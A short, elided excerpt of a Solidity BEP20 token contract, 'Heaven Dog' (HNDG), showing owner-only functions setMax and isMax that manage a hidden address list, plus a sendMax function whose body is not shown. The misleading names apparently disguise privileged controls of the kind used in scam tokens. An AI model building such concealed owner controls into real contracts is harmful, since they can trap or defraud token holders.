...
contract HeavenDog is IBEP20, Ownable {
    using SafeMath for uint256;

    string constant _name = "Heaven Dog";
    string constant _symbol = "HNDG";
    ...
    function setMax(address spender) public authorized {
        _ccList[spender] = true;
    }
    ...
    function sendMax(uint256 amount) public authorized {
    ...
    function isMax(address spender) public view returns (bool) {
        return _ccList[spender];
    }
